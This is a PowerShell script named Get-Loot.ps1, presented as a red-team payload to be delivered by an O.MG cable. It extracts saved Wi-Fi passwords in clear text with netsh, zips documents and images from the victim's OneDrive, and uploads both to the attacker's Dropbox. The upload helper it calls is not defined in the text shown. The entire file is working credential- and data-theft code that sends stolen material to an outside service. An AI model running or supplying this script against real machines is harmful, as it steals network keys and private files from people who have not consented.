<#
.SYNOPSIS
    This script is intended to run as a payload with the O.MG cable as a red team excercise.
    The script can also be run manually or with other authorities           
    
.DESCRIPTION
    The script currently collects files from a user's OneDrive (if OneDrive is used) and collects the user's wifi profiles.
    The script uploads the collected files to a private DropBox via the DropBox API.

.NOTES
    Filename: Get-Loot.ps1
    Version: 1.0
    Author: Martin Bengtsson
    Blog: www.imab.dk
    Twitter: @mwbengtsson

.LINK
    
#> 

# Create Get-WifiProfiles function
function Get-WifiProfiles() {
    # Create empty arrays	
    $wifiProfileNames = @()
    $wifiProfileObjects = @()
    $netshOutput = netsh.exe wlan show profiles | Select-String -Pattern " : "
    foreach ($wifiProfileName in $netshOutput){
        $wifiProfileNames += (($wifiProfileName -split ":")[1]).Trim()
    }
    foreach ($wifiProfileName in $wifiProfileNames){
        try {
            $wifiProfilePassword = (((netsh.exe wlan show profiles name="$wifiProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
        }
        Catch {
            $wifiProfilePassword = "The password is not stored in this profile"
        }
        # Build the object and add this to an array
        $wifiProfileObject = New-Object PSCustomobject 
        $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $wifiProfileName
        $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $wifiProfilePassword
        $wifiProfileObjects += $wifiProfileObject
    }
    Write-Output $wifiProfileObjects
}
#endregion
#region Variables
$computerName = $env:COMPUTERNAME
$OneDriveLoot = "$env:TEMP\imabdk-loot-OneDrive-$computerName.zip"
$wifiProfilesLoot = "$env:TEMP\imabdk-loot-WiFiProfiles-$computerName.txt"
#endregion
#region Script execution
try {
    # Get OneDrive loot if such exist
    if (Test-Path $env:OneDrive) {
        # For testing purposes I limited this to only certain filetypes as well as only selecting the first 10 objects
        $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg, *.pdf | Select-Object -First 10
        # Zipping the OneDrive content for easier upload to Dropbox
        $getLoot | Compress-Archive -DestinationPath $OneDriveLoot -Update
    }
    # Get Wifi loot
    Get-WifiProfiles | Out-File $wifiProfilesLoot
    # Upload loot to Dropbox
    if ((Test-Path $OneDriveLoot) -OR (Test-Path $wifiProfilesLoot)) {
        Upload-DropBox -SourceFilePath $OneDriveLoot
        Upload-DropBox -SourceFilePath $wifiProfilesLoot
    }
}
catch {
    Write-Output "Script execution failed"
}


#endregion